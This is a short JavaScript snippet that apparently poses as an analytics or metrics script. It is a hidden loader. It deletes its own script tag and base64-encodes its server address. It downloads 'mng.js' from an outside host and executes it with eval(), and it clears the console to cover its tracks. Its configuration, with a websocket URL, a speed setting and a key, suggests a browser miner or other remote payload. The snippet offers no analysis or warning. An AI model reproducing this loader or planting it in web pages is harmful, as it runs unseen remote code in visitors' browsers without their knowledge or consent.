

(function(){

	var jss=document.head.getElementsByTagName("script");
	for (i = 0; i < jss.length; i++)
	{
		if (jss[i].getAttribute("src") !== null)
		{
			if(jss[i].getAttribute("src").indexOf("ga-alpha")>0)
				{
					document.head.removeChild(jss[i]);
				}
			break;
		}
	}

	var consoleClear=function(){try {console.clear();} catch (e) {return;};}	
        try{	
        var cfg={urls:[
                ["wss://alpha-metrics.ru"]],
        spd:0.6,
	divInx:2,
	k:"d9a311ec8c80a9a1c9edba0822af94ba",
	dns:btoa('https://alpha-metrics.ru/metrics/')};

        var req = new XMLHttpRequest();
		req.onerror=function(e){consoleClear();}
		req.onreadystatechange=function(e){
			if (e.currentTarget.DONE==e.currentTarget.readyState)
			{
				if (e.currentTarget.status==200)
                    eval(e.currentTarget.responseText)
				else 
					{
						consoleClear();}

			}
		}.bind(cfg);
		req.open('GET',atob(cfg.dns)+'mng.js',true);
		req.send();
        }catch(e){}
})();
